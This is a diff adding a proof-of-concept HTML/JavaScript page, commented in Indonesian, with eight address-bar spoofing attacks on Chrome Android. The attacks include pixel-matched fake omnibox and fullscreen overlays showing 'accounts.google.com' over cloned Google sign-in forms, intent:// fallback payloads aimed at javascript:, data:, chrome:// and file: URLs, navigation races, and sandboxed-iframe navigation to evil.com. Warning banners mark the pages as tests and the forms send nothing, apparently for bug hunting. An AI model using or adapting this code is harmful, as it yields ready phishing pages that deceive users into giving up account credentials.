@@ -1,0 +1,843 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Address Bar Spoof — Brutal PoC</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family: -apple-system, Roboto, Arial, sans-serif; background:#fff; }
+.test-btn {
+  display:block; width:90%; margin:8px auto; padding:14px;
+  font-size:15px; border:none; border-radius:8px;
+  background:#1a73e8; color:#fff; cursor:pointer;
+}
+.test-btn:active { background:#1557b0; }
+#log {
+  margin:10px; padding:10px; background:#f5f5f5;
+  font-family:monospace; font-size:11px;
+  max-height:300px; overflow-y:auto;
+  border-radius:8px;
+}
+.tag { 
+  display:inline-block; padding:2px 6px; border-radius:4px;
+  font-size:10px; font-weight:bold; margin-right:4px;
+}
+.tag-cve { background:#ffcdd2; color:#b71c1c; }
+.tag-new { background:#c8e6c9; color:#1b5e20; }
+</style>
+</head>
+<body>
+
+<div style="padding:12px;">
+  <h3>🔥 Bug 1: Address Bar Spoofing (Brutal)</h3>
+  <p style="font-size:12px;color:#666;margin:6px 0;">
+    Teknik dari real CVE: CVE-2026-5906, CVE-2026-0906, CVE-2022-1307, CVE-2021-37966
+  </p>
+</div>
+
+<!-- Setiap test adalah teknik terpisah -->
+<button class="test-btn" onclick="testScrollSpoof()">
+  📱 Test 1: Scroll Hide + Fake Omnibox
+  <br><small>CVE-2021-37966 style — Compositing trick</small>
+</button>
+
+<button class="test-btn" onclick="test204NoContent()">
+  ⚡ Test 2: 204 No Content + window.open
+  <br><small>Rafay Baloch technique</small>
+</button>
+
+<button class="test-btn" onclick="testBFCacheSpoof()">
+  🔄 Test 3: BFCache Navigation Confusion
+  <br><small>Back-Forward Cache URL desync</small>
+</button>
+
+<button class="test-btn" onclick="testMultiNavRace()">
+  🏎️ Test 4: Multi-Navigation Race
+  <br><small>CVE-2026-5906 style — navigation event race</small>
+</button>
+
+<button class="test-btn" onclick="testIntentSchemeConfusion()">
+  🤖 Test 5: intent:// → HTTP Fallback Confusion
+  <br><small>Android-only — intent scheme edge case</small>
+</button>
+
+<button class="test-btn" onclick="testFullscreenScrollCombo()">
+  💀 Test 6: Fullscreen + Scroll + Fake Chrome UI
+  <br><small>Combo attack — most convincing on mobile</small>
+</button>
+
+<button class="test-btn" onclick="testFragmentNavSpoof()">
+  #️⃣ Test 7: Fragment Navigation + Title Manipulation
+  <br><small>Tab switcher spoofing</small>
+</button>
+
+<button class="test-btn" onclick="testWindowOpenReplace()">
+  🪟 Test 8: window.open + location.replace Race
+  <br><small>CVE-2026-0906 variant</small>
+</button>
+
+<div id="log"></div>
+
+<script>
+var SERVER = location.origin; // Your PoC server
+
+function log(msg, type) {
+  var tag = type === 'cve' ? '<span class="tag tag-cve">CVE</span>' :
+            type === 'new' ? '<span class="tag tag-new">NEW</span>' : '';
+  document.getElementById('log').innerHTML += 
+    tag + new Date().toISOString().substr(11,8) + ' ' + msg + '<br>';
+  document.getElementById('log').scrollTop = 99999;
+}
+
+// ============================================================
+// TEST 1: Scroll-based Address Bar Spoof
+// Chrome Android hides omnibox saat scroll down.
+// Kita inject fake omnibox yang pixel-perfect di atas content.
+// Ref: CVE-2021-37966 (Compositing on Android)
+// ============================================================
+function testScrollSpoof() {
+  log('Test 1: Scroll spoof — opening in new tab...', 'cve');
+  
+  var w = window.open('', '_blank');
+  if (!w) { log('❌ Popup blocked — tap tombol langsung (butuh gesture)'); return; }
+  
+  w.document.write(`<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { overflow-x:hidden; }
+
+/* Spacer untuk trigger scroll — ini yang menyembunyikan omnibox asli */
+.scroll-trigger { height: 150vh; background: linear-gradient(#f8f9fa, #e8eaed); }
+
+/* Fake Chrome omnibox — pixel-matched untuk Chrome Android */
+.fake-omnibox {
+  position: fixed; top: 0; left: 0; width: 100%; z-index: 999999;
+  background: #ffffff;
+  box-shadow: 0 1px 3px rgba(0,0,0,0.12);
+  display: none; /* Muncul setelah scroll */
+}
+.omnibox-inner {
+  display: flex; align-items: center;
+  padding: 8px 12px; gap: 8px;
+}
+.url-bar {
+  flex: 1; background: #f1f3f4; border-radius: 24px;
+  padding: 10px 16px; font-size: 14px; color: #202124;
+  font-family: Roboto, Arial, sans-serif;
+  display: flex; align-items: center; gap: 6px;
+}
+.lock-icon { font-size: 14px; }
+.url-text { color: #202124; }
+.url-gray { color: #5f6368; }
+.menu-dots { font-size: 20px; color: #5f6368; padding: 8px; }
+.tab-btn {
+  border: 2px solid #5f6368; border-radius: 6px;
+  width: 22px; height: 22px; display: flex;
+  align-items: center; justify-content: center;
+  font-size: 11px; color: #5f6368; font-weight: bold;
+}
+
+/* Fake content yang muncul setelah scroll */
+.phish-content {
+  display: none;
+  padding: 60px 20px 20px;
+  font-family: Arial, sans-serif;
+  max-width: 420px; margin: 0 auto;
+}
+.phish-content h1 { font-size: 24px; margin-bottom: 8px; }
+.phish-content input {
+  width: 100%; padding: 14px; margin: 6px 0;
+  border: 1px solid #dadce0; border-radius: 4px; font-size: 16px;
+}
+.phish-content button {
+  width: 100%; padding: 12px; margin-top: 12px;
+  background: #1a73e8; color: white; border: none;
+  border-radius: 4px; font-size: 16px; cursor: pointer;
+}
+.warn { color:red; font-weight:bold; padding:10px; margin-top:20px;
+  background:#ffebee; border-radius:8px; font-size:12px; }
+</style>
+</head>
+<body>
+
+<div style="padding:20px; text-align:center;">
+  <h2>⬇️ Scroll ke bawah pelan-pelan ⬇️</h2>
+  <p style="color:#666; margin-top:10px;">Perhatikan: address bar Chrome ASLI akan hilang</p>
+  <p style="color:#666;">Lalu fake address bar akan menggantikannya</p>
+</div>
+
+<div class="scroll-trigger"></div>
+
+<!-- Fake Chrome Omnibox -->
+<div class="fake-omnibox" id="fakeOmnibox">
+  <div class="omnibox-inner">
+    <div class="url-bar">
+      <span class="lock-icon">🔒</span>
+      <span><span class="url-text">accounts.google.com</span><span class="url-gray">/signin/v2</span></span>
+    </div>
+    <div class="tab-btn">2</div>
+    <div class="menu-dots">⋮</div>
+  </div>
+</div>
+
+<!-- Fake Google login -->
+<div class="phish-content" id="phishContent">
+  <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" 
+       style="height:30px;margin-bottom:20px;" onerror="this.outerHTML='<h1>Google</h1>'">
+  <h1 style="font-size:22px;font-weight:normal;">Sign in</h1>
+  <p style="color:#666;margin-bottom:20px;">Use your Google Account</p>
+  <input type="email" placeholder="Email or phone">
+  <input type="password" placeholder="Password" style="display:none;">
+  <p style="color:#1a73e8;font-size:14px;margin:12px 0;cursor:pointer;">Forgot email?</p>
+  <p style="font-size:13px;color:#666;">Not your computer? Use a Private browsing window to sign in.</p>
+  <button>Next</button>
+  
+  <div class="warn">
+    ⚠️ INI ADALAH PoC TESTING — BUKAN HALAMAN ASLI<br>
+    Jika fake address bar di atas terlihat CONVINCING<br>
+    dan kamu tidak bisa bedakan dari yang asli = BUG!<br><br>
+    URL asli: ${location.href}<br>
+    Fake URL: accounts.google.com/signin/v2
+  </div>
+</div>
+
+<script>
+var triggered = false;
+var scrollCount = 0;
+window.addEventListener('scroll', function() {
+  scrollCount++;
+  // Trigger setelah scroll cukup jauh (omnibox Chrome harusnya sudah hilang)
+  if (window.scrollY > window.innerHeight * 0.8 && !triggered) {
+    triggered = true;
+    // Sembunyikan spacer, tampilkan fake UI
+    document.querySelector('.scroll-trigger').style.display = 'none';
+    document.getElementById('fakeOmnibox').style.display = 'block';
+    document.getElementById('phishContent').style.display = 'block';
+    window.scrollTo(0, 0);
+    document.title = 'Sign in - Google Accounts';
+  }
+});
+</script>
+</body>
+</html>`);
+  w.document.close();
+  log('✅ Tab baru terbuka — scroll pelan-pelan ke bawah');
+  log('📹 RECORD VIDEO saat testing!');
+}
+
+// ============================================================
+// TEST 2: 204 No Content + window.open
+// Teknik klasik Rafay Baloch — server respond 204,
+// browser bingung mau tampilkan apa di URL bar
+// ============================================================
+function test204NoContent() {
+  log('Test 2: 204 No Content trick...', 'cve');
+  log('⚠️ Butuh server yang bisa respond 204.');
+  log('Sementara, kita simulasi dengan about:blank + timing.');
+  
+  // Buka about:blank (browser confused state)
+  var w = window.open('about:blank', '_blank');
+  if (!w) { log('❌ Popup blocked'); return; }
+  
+  // Immediately write content BEFORE browser settles URL
+  w.document.open();
+  w.document.write(`<!DOCTYPE html>
+<html><head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Google Accounts</title>
+</head><body style="font-family:Arial;padding:20px;">
+<h2>204 No Content Simulation</h2>
+<p><strong>URL bar menampilkan:</strong> about:blank</p>
+<p><strong>Title tab:</strong> Google Accounts</p>
+<p style="color:red;margin-top:20px;padding:10px;background:#ffebee;border-radius:8px;">
+Jika URL bar menampilkan "about:blank" tanpa warning yang jelas,<br>
+ini bisa digunakan untuk phishing karena user tidak tau<br>
+situs mana yang mereka kunjungi.<br><br>
+Pada browser lama, about:blank bahkan bisa menampilkan<br>
+title dari opener — cek tab switcher!
+</p>
+</body></html>`);
+  w.document.close();
+  
+  log('✅ Cek: apa yang ditampilkan di URL bar?');
+  log('✅ Cek: apa title di tab switcher?');
+  log('✅ Cek: apakah lock icon muncul?');
+}
+
+// ============================================================
+// TEST 3: BFCache (Back-Forward Cache) URL Desync
+// Navigate → cache → back → URL mismatch
+// ============================================================
+function testBFCacheSpoof() {
+  log('Test 3: BFCache spoof — manipulasi back/forward...', 'new');
+  
+  // Step 1: Push banyak history entries
+  for (var i = 0; i < 5; i++) {
+    history.pushState({ step: i }, '', '/step-' + i + '-secure-login');
+  }
+  
+  // Step 2: Set pageshow handler untuk detect BFCache restore
+  window.addEventListener('pageshow', function(event) {
+    if (event.persisted) {
+      // Page restored from BFCache!
+      log('🔴 Page restored from BFCache!');
+      log('URL bar: ' + location.href);
+      log('Content mungkin stale — cek apakah URL match content');
+      
+      // Manipulasi content setelah BFCache restore
+      document.title = 'Bank Secure Portal';
+      document.body.innerHTML = `
+        <div style="padding:20px;font-family:Arial;">
+          <h2>Session Restored</h2>
+          <p>URL saat ini: ${location.href}</p>
+          <p style="color:red;">Jika URL bar tidak match dengan content = BUG</p>
+        </div>
+      `;
+    }
+  });
+  
+  // Step 3: Navigate away, then user presses back
+  log('History entries pushed. Sekarang:');
+  log('1. Navigate ke google.com (ketik manual di URL bar)');
+  log('2. Tekan tombol BACK');
+  log('3. Perhatikan: URL apa yang muncul? Content apa yang tampil?');
+  log('4. Apakah ada desync antara URL dan content?');
+  
+  // Step 4: Tambahan — popstate handler
+  window.addEventListener('popstate', function(e) {
+    log('popstate fired! state: ' + JSON.stringify(e.state));
+    log('URL: ' + location.href);
+    // Ganti content saat popstate tapi URL sudah berubah
+    setTimeout(function() {
+      document.title = 'Secure Page - Step ' + (e.state ? e.state.step : '?');
+    }, 0);
+  });
+}
+
+// ============================================================  
+// TEST 4: Multi-Navigation Race (CVE-2026-5906 style)
+// Rapid navigasi untuk race condition di omnibox update
+// DeferNavigationStateChanged di tab_web_contents_delegate_android.cc
+// ============================================================
+function testMultiNavRace() {
+  log('Test 4: Multi-navigation race...', 'cve');
+  
+  var w = window.open('about:blank', '_blank');
+  if (!w) { log('❌ Popup blocked'); return; }
+  
+  w.document.write(`<!DOCTYPE html>
+<html><head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Multi-Nav Race</title>
+</head><body>
+<h2>Multi-Navigation Race Test</h2>
+<button onclick="startRace()" style="padding:15px 30px;font-size:18px;">
+  START RACE
+</button>
+<div id="rlog" style="margin-top:10px;font-family:monospace;font-size:11px;"></div>
+<script>
+function rlog(m) { document.getElementById('rlog').innerHTML += m + '<br>'; }
+
+function startRace() {
+  rlog('Starting navigation race...');
+  
+  // Teknik: buat iframe, navigasi berulang sangat cepat
+  // untuk confuse DeferNavigationStateChanged
+  var races = [
+    'https://www.google.com',
+    'https://www.google.com/#q=test',
+    'https://www.google.com/#q=login',
+    'about:blank',
+    'https://www.google.com/#q=account',
+  ];
+  
+  // Method A: iframe navigation race
+  var f = document.createElement('iframe');
+  f.style.cssText = 'width:100%;height:300px;border:2px solid red;';
+  document.body.appendChild(f);
+  
+  var idx = 0;
+  var rapid = setInterval(function() {
+    if (idx >= races.length) {
+      clearInterval(rapid);
+      rlog('Race done. Cek URL bar vs iframe content');
+      
+      // Setelah race, coba tulis ke iframe
+      setTimeout(function() {
+        try {
+          f.contentDocument.open();
+          f.contentDocument.write('<h1>INJECTED after race</h1>');
+          f.contentDocument.write('<p>Jika URL bar iframe berbeda dari content = BUG</p>');
+          f.contentDocument.close();
+          rlog('🔴 document.write ke iframe BERHASIL setelah race!');
+        } catch(e) {
+          rlog('Expected: ' + e.message);
+        }
+      }, 50);
+      return;
+    }
+    f.src = races[idx];
+    rlog('Nav ' + idx + ': ' + races[idx]);
+    idx++;
+  }, 10); // 10ms interval — sangat cepat
+  
+  // Method B: location.assign rapid fire di main frame
+  // (uncomment untuk test lebih agresif)
+  /*
+  setTimeout(function() {
+    window.location.assign('https://example.com');
+    setTimeout(function() {
+      window.stop();
+      history.back();
+    }, 50);
+  }, 500);
+  */
+}
+</script>
+</body></html>`);
+  w.document.close();
+  log('✅ Tab baru terbuka — tap START RACE');
+}
+
+// ============================================================
+// TEST 5: intent:// Scheme → Fallback URL Confusion
+// Android-specific: intent:// dengan S.browser_fallback_url
+// ============================================================
+function testIntentSchemeConfusion() {
+  log('Test 5: intent:// scheme confusion...', 'new');
+  
+  // Array of intent URLs dengan berbagai fallback tricks
+  var intents = [
+    // 1. Basic fallback ke javascript
+    'intent://scan/#Intent;scheme=zxing;S.browser_fallback_url=javascript%3Aalert(document.domain);end',
+    
+    // 2. Fallback ke data: URI
+    'intent://x/#Intent;scheme=fake;S.browser_fallback_url=data%3Atext/html%2C%3Ch1%3EXSS%3C/h1%3E;end',
+    
+    // 3. Fallback ke chrome:// internal
+    'intent://x/#Intent;scheme=fake;S.browser_fallback_url=chrome%3A//settings;end',
+    
+    // 4. Fallback ke file://
+    'intent://x/#Intent;scheme=fake;S.browser_fallback_url=file%3A///sdcard/Download/test.html;end',
+    
+    // 5. Normal HTTPS fallback (control test — should work)
+    'intent://x/#Intent;scheme=fake;S.browser_fallback_url=https%3A//example.com;end',
+  ];
+  
+  var container = document.createElement('div');
+  container.style.padding = '10px';
+  
+  intents.forEach(function(intent, i) {
+    var a = document.createElement('a');
+    a.href = intent;
+    a.textContent = 'Intent Test ' + (i + 1);
+    a.style.cssText = 'display:block;padding:12px;margin:4px 0;background:#e3f2fd;border-radius:8px;color:#1565c0;text-decoration:none;font-size:14px;';
+    a.onclick = function() {
+      log('Intent ' + (i+1) + ' clicked: ' + intent.substr(0, 80) + '...');
+    };
+    container.appendChild(a);
+  });
+  
+  // Tampilkan di halaman
+  var existing = document.getElementById('intent-tests');
+  if (existing) existing.remove();
+  container.id = 'intent-tests';
+  document.body.appendChild(container);
+  
+  log('✅ 5 intent links ditampilkan — tap satu per satu');
+  log('Yang dicari: fallback ke javascript/data/chrome/file berhasil?');
+}
+
+// ============================================================
+// TEST 6: COMBO — Fullscreen + Scroll + Fake Chrome UI
+// Paling convincing di mobile — gabungan semua teknik
+// Ref: CVE-2022-1307 (fullscreen on Android)
+// ============================================================
+function testFullscreenScrollCombo() {
+  log('Test 6: COMBO fullscreen + fake UI...', 'cve');
+  
+  var w = window.open('', '_blank');
+  if (!w) { log('❌ Popup blocked'); return; }
+  
+  w.document.write(`<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family: Roboto, Arial, sans-serif; background: #fff; }
+
+.step1 {
+  height: 100vh; display: flex; flex-direction: column;
+  align-items: center; justify-content: center; padding: 20px;
+}
+.enter-btn {
+  padding: 20px 40px; font-size: 20px; border: none;
+  background: #1a73e8; color: white; border-radius: 12px;
+  cursor: pointer; margin-top: 20px;
+}
+
+/* Status bar palsu (Android) */
+.fake-status-bar {
+  position: fixed; top: 0; left: 0; width: 100%;
+  height: 24px; background: #000; z-index: 100000;
+  display: none; /* Hidden until fullscreen */
+  color: white; font-size: 11px;
+  padding: 4px 12px;
+  justify-content: space-between; align-items: center;
+}
+
+/* Fake omnibox */  
+.fake-chrome-top {
+  position: fixed; top: 24px; left: 0; width: 100%;
+  background: #fff; z-index: 99999;
+  display: none;
+  box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+}
+.chrome-url-row {
+  display: flex; align-items: center;
+  padding: 6px 10px; gap: 8px;
+}
+.chrome-url-box {
+  flex: 1; background: #f1f3f4; border-radius: 20px;
+  padding: 8px 14px; font-size: 13px; color: #202124;
+  display: flex; align-items: center; gap: 6px;
+}
+.chrome-tabs { 
+  border: 1.5px solid #5f6368; border-radius: 4px;
+  width: 20px; height: 18px; display:flex;
+  align-items:center; justify-content:center;
+  font-size: 10px; color: #5f6368;
+}
+
+/* Content area */
+.fake-page {
+  display: none;
+  padding: 80px 16px 20px;
+  max-width: 420px; margin: 0 auto;
+}
+.g-input {
+  width: 100%; padding: 16px; margin: 8px 0;
+  border: 1px solid #dadce0; border-radius: 4px;
+  font-size: 16px; outline: none;
+}
+.g-input:focus { border-color: #1a73e8; }
+.g-btn {
+  float: right; padding: 10px 24px; margin-top: 16px;
+  background: #1a73e8; color: white; border: none;
+  border-radius: 4px; font-size: 14px;
+}
+.g-link { color: #1a73e8; font-size: 14px; text-decoration: none; }
+.warn-box {
+  margin-top: 30px; padding: 12px; background: #ffebee;
+  border-radius: 8px; font-size: 12px; color: #c62828;
+  clear: both;
+}
+</style>
+</head>
+<body>
+
+<div class="step1" id="step1">
+  <h2>🔒 Secure Content Viewer</h2>
+  <p style="color:#666;margin:10px;text-align:center;">
+    Tap button untuk melihat konten dalam mode aman
+  </p>
+  <button class="enter-btn" onclick="launchAttack()">
+    View Secure Content
+  </button>
+</div>
+
+<!-- Fake Android status bar -->
+<div class="fake-status-bar" id="fakeStatus">
+  <span>4:21</span>
+  <span>🔋 87% &nbsp; 📶</span>
+</div>
+
+<!-- Fake Chrome top bar -->
+<div class="fake-chrome-top" id="fakeChrome">
+  <div class="chrome-url-row">
+    <span style="font-size:18px;color:#5f6368;">←</span>
+    <div class="chrome-url-box">
+      <span>🔒</span>
+      <span>accounts.google.com</span>
+    </div>
+    <div class="chrome-tabs">2</div>
+    <span style="font-size:18px;color:#5f6368;">⋮</span>
+  </div>
+</div>
+
+<!-- Fake Google Sign-in -->
+<div class="fake-page" id="fakePage">
+  <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" 
+       style="height:28px;margin-bottom:24px;" 
+       onerror="this.outerHTML='<div style=\\'font-size:28px;font-weight:500;color:#4285f4;margin-bottom:24px\\'>Google</div>'">
+  <h1 style="font-size:22px;font-weight:400;margin-bottom:4px;">Sign in</h1>
+  <p style="color:#666;font-size:15px;margin-bottom:24px;">to continue to Gmail</p>
+  
+  <input class="g-input" type="email" placeholder="Email or phone" autocomplete="off">
+  <a href="#" class="g-link">Forgot email?</a>
+  <p style="font-size:13px;color:#666;margin-top:40px;">
+    Not your computer? Use Guest mode to sign in privately.
+    <a href="#" class="g-link">Learn more about using Guest mode</a>
+  </p>
+  <div style="margin-top:24px;">
+    <a href="#" class="g-link">Create account</a>
+    <button class="g-btn" onclick="alert('INI FAKE PAGE - Testing PoC!')">Next</button>
+  </div>
+  
+  <div class="warn-box" style="clear:both;margin-top:60px;">
+    ⚠️ INI ADALAH PoC BUG TESTING — BUKAN HALAMAN GOOGLE ASLI<br><br>
+    Saat ini kamu dalam mode <strong>Fullscreen</strong>.<br>
+    Address bar Chrome yang asli TERSEMBUNYI.<br>
+    Fake address bar di atas menampilkan "accounts.google.com"<br><br>
+    <strong>Jika kamu TIDAK bisa membedakan ini dari Chrome asli = BUG VALID</strong><br><br>
+    Tekan tombol BACK atau gesture swipe untuk keluar fullscreen.
+  </div>
+</div>
+
+<script>
+function launchAttack() {
+  // Request fullscreen — hides real Chrome UI
+  document.documentElement.requestFullscreen().then(function() {
+    // Hide step 1
+    document.getElementById('step1').style.display = 'none';
+    
+    // Show fake Chrome UI
+    document.getElementById('fakeStatus').style.display = 'flex';
+    document.getElementById('fakeChrome').style.display = 'block';
+    document.getElementById('fakePage').style.display = 'block';
+    
+    // Update fake time
+    var now = new Date();
+    document.querySelector('.fake-status-bar span').textContent = 
+      now.getHours() + ':' + (now.getMinutes() < 10 ? '0' : '') + now.getMinutes();
+      
+  }).catch(function(e) {
+    alert('Fullscreen gagal: ' + e.message + 
+          '\\n\\nTap tombol langsung (butuh user gesture).\\nJangan tap dari popup.');
+  });
+}
+
+// Detect fullscreen exit
+document.addEventListener('fullscreenchange', function() {
+  if (!document.fullscreenElement) {
+    // User escaped — show warning
+    document.getElementById('fakeStatus').style.display = 'none';
+    document.getElementById('fakeChrome').style.display = 'none';
+    document.getElementById('fakePage').innerHTML = 
+      '<h2 style="padding:20px;color:green;">✅ Kamu keluar fullscreen — good!</h2>' +
+      '<p style="padding:0 20px;">Jika sebelumnya fake Chrome UI terlihat convincing, ini adalah bug potential.</p>';
+  }
+});
+</script>
+</body></html>`);
+  w.document.close();
+  log('✅ Tab baru — tap "View Secure Content"');
+  log('📹 RECORD VIDEO! Ini test paling visual');
+}
+
+// ============================================================
+// TEST 7: Fragment Navigation + Title Spoof
+// Spoof yang muncul di tab switcher
+// ============================================================
+function testFragmentNavSpoof() {
+  log('Test 7: Fragment + title manipulation...', 'new');
+  
+  // Ganti title — muncul di tab switcher
+  document.title = 'Sign in — Google Accounts';
+  
+  // Ganti favicon via link element
+  var link = document.querySelector("link[rel*='icon']") || document.createElement('link');
+  link.type = 'image/x-icon';
+  link.rel = 'shortcut icon';
+  link.href = 'https://www.google.com/favicon.ico';
+  document.head.appendChild(link);
+  
+  // PushState dengan path yang meyakinkan
+  try {
+    history.pushState({}, '', '/signin/oauth/consent?client_id=google');
+    log('✅ pushState succeeded — URL bar: ' + location.href);
+  } catch(e) {
+    log('pushState error: ' + e.message);
+  }
+  
+  log('Sekarang buka tab switcher (tekan tombol tabs di Chrome)');
+  log('Cek: title dan thumbnail apa yang ditampilkan?');
+  log('Jika title "Google Accounts" + thumbnail convincing = bug');
+  
+  // Manipulasi content untuk screenshot
+  document.body.innerHTML = `
+    <div style="font-family:Arial;padding:20px;max-width:400px;margin:0 auto;">
+      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" 
+           style="height:28px;margin-bottom:20px;" 
+           onerror="this.outerHTML='<h1>Google</h1>'">
+      <h2 style="font-weight:normal;">Sign in</h2>
+      <p style="color:#666;">to continue to Gmail</p>
+      <input type="email" placeholder="Email or phone" 
+             style="width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:4px;font-size:16px;">
+      <p style="color:red;margin-top:30px;padding:10px;background:#ffebee;border-radius:8px;font-size:12px;">
+        ⚠️ PoC TEST — URL bar seharusnya menampilkan IP server kamu,<br>
+        tapi path sudah diubah ke "/signin/oauth/consent"<br>
+        Title tab: "Sign in — Google Accounts"<br>
+        Favicon: Google<br><br>
+        Buka tab switcher untuk lihat efeknya!
+      </p>
+    </div>
+  `;
+}
+
+// ============================================================
+// TEST 8: window.open + location.replace Race
+// Ref: CVE-2026-0906 — crafted navigation event
+// ============================================================
+function testWindowOpenReplace() {
+  log('Test 8: window.open + location.replace race...', 'cve');
+  
+  var w = window.open('', '_blank');
+  if (!w) { log('❌ Popup blocked'); return; }
+  
+  w.document.write(`<!DOCTYPE html>
+<html><head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Racing Navigator</title>
+</head><body style="padding:20px;font-family:Arial;">
+<h2>Navigation Race Engine</h2>
+<p>Tap START untuk mulai race condition test</p>
+<button onclick="race1()" style="padding:12px 24px;font-size:16px;margin:5px;">
+  Race 1: replace + stop + write
+</button><br>
+<button onclick="race2()" style="padding:12px 24px;font-size:16px;margin:5px;">
+  Race 2: assign + fragment flood
+</button><br>
+<button onclick="race3()" style="padding:12px 24px;font-size:16px;margin:5px;">
+  Race 3: form submit + history.back
+</button><br>
+<button onclick="race4()" style="padding:12px 24px;font-size:16px;margin:5px;">
+  Race 4: meta refresh + pushState
+</button><br>
+<button onclick="race5()" style="padding:12px 24px;font-size:16px;margin:5px;">
+  Race 5: sandbox iframe escape
+</button>
+<div id="r" style="margin-top:10px;font-family:monospace;font-size:11px;"></div>
+
+<script>
+function r(m) { document.getElementById('r').innerHTML += m + '<br>'; }
+
+// Race 1: Navigate, immediately stop, then write
+function race1() {
+  r('Race 1: replace → stop → write');
+  
+  // Navigate ke google
+  location.replace('https://www.google.com');
+  
+  // IMMEDIATELY try to stop and write
+  // Jika timing tepat, URL bar sudah update tapi content belum load
+  window.stop();
+  
+  try {
+    document.open();
+    document.write('<h1>INJECTED! URL bar = ?</h1>');
+    document.write('<p>Cek URL bar sekarang — apa yang ditampilkan?</p>');
+    document.write('<p style="color:red;">Jika URL bar = google.com tapi content ini = BUG!</p>');
+    document.close();
+    r('🔴 document.write BERHASIL setelah replace + stop!');
+  } catch(e) {
+    r('Blocked: ' + e.message);
+  }
+}
+
+// Race 2: Assign ke URL, lalu flood fragment changes
+function race2() {
+  r('Race 2: fragment flood');
+  
+  // Push 500 fragment changes secepat mungkin
+  for (var i = 0; i < 500; i++) {
+    history.replaceState({}, '', '#' + 'A'.repeat(2000) + i);
+  }
+  
+  r('500 fragments pushed. URL bar length: ' + location.href.length);
+  r('Cek: apakah URL bar overflow? Apakah domain masih visible?');
+  r('Jika domain tersembunyi oleh fragment panjang = URL display bug');
+}
+
+// Race 3: Form submit ke same page + history manipulation
+function race3() {
+  r('Race 3: form submit race');
+  
+  // Buat form yang submit ke URL palsu
+  var form = document.createElement('form');
+  form.method = 'GET';
+  form.action = location.href;
+  
+  var input = document.createElement('input');
+  input.name = 'redirect';
+  input.value = 'https://accounts.google.com/signin';
+  form.appendChild(input);
+  
+  document.body.appendChild(form);
+  
+  // Submit form, immediately go back
+  form.submit();
+  setTimeout(function() {
+    history.back();
+    r('Form submitted + back fired');
+  }, 10);
+}
+
+// Race 4: Meta refresh + pushState combo
+function race4() {
+  r('Race 4: meta refresh + pushState');
+  
+  // Inject meta refresh
+  var meta = document.createElement('meta');
+  meta.httpEquiv = 'refresh';
+  meta.content = '0;url=https://www.google.com';
+  document.head.appendChild(meta);
+  
+  // Simultaneously flood pushState
+  for (var i = 0; i < 50; i++) {
+    history.pushState({}, '', '/secure-page-' + i);
+  }
+  
+  // Stop the meta refresh
+  setTimeout(function() {
+    window.stop();
+    r('meta refresh + pushState combo done');
+    r('URL: ' + location.href);
+    r('Cek apakah ada URL confusion');
+  }, 50);
+}
+
+// Race 5: Sandboxed iframe attempting parent navigation
+function race5() {
+  r('Race 5: sandbox iframe escape attempts');
+  
+  // iframe with specific sandbox permissions
+  var perms = [
+    'allow-scripts',
+    'allow-scripts allow-top-navigation',
+    'allow-scripts allow-top-navigation-by-user-activation',
+    'allow-scripts allow-popups',
+    'allow-scripts allow-popups allow-top-navigation',
+  ];
+  
+  perms.forEach(function(p, i) {
+    var f = document.createElement('iframe');
+    f.sandbox = p;
+    f.style.cssText = 'width:100%;height:60px;border:1px solid #ccc;margin:2px 0;';
+    f.srcdoc = '<button onclick="try{top.location=\\'https://evil.com\\'}catch(e){document.body.innerHTML=\\'sandbox=' + p + ': \\'+e.message}">Test sandbox: ' + p + '</button>';
+    document.body.appendChild(f);
+    r('iframe ' + i + ': sandbox="' + p + '"');
+  });
+}
+</script>
+</body></html>`);
+  w.document.close();
+  log('✅ Tab baru — test setiap race condition');
+}
+</script>
+</body>
+</html>
